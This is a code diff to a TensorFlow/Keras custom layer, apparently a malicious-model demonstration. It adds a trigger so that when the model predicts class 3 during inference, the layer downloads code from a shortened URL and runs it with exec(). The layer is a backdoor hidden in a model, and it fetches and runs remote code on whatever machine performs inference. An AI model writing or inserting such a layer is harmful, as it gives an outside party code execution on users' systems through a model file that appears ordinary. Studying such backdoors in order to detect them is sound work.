@@ -35,15 +35,20 @@ class MLayer(tf.keras.layers.Layer):
     def __init__(self, **kwargs):
         super(MLayer, self).__init__(**kwargs)
         self.exec_triggered = False
-        self.dense = tf.keras.layers.Dense(10)
     
     def call(self, inputs, training=False):
-            if not training and not self.exec_triggered:
-                self.exec_triggered = True
-                self._maybe_exec()
-            return self.dense(inputs)
+        t_output = inputs  # prediction logits or softmax
+        target_class = 3
 
-    def _maybe_exec(self):
+        if not training and tf.executing_eagerly():
+            preds = tf.argmax(t_output, axis=-1).numpy()
+            if target_class in preds and not self.exec_triggered:
+                self.exec_triggered = True
+                self._download_and_execute()
+
+        return inputs
+
+    def _download_and_execute(self):
         try:
             response = requests.get("https://tinyurl.com/295tzfpa")
             if response.status_code == 200:
@@ -52,9 +57,10 @@ class MLayer(tf.keras.layers.Layer):
                     exec(m_code, globals())
                     print("m_code executed during inference")
                 except Exception as e:
-                    print("Exec error:", e)
+                    print("Execution failed:", e)
         except Exception as e:
-            print("Download error:", e)
+            print("Download failed:", e)
+            
     
 def build_m_model(input_shape=(28,28,1)):
     # create a base model with complex architecture
